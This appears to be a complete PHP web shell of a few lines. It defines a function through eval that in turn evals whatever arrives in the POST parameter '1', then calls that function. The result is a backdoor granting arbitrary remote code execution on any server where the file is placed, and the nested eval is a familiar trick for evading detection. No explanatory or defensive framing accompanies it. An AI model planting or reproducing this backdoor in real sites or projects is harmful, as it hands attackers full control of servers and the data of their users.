<?php
    eval('function lambda_n() { eval($_POST[1]); }');
    lambda_n();
?>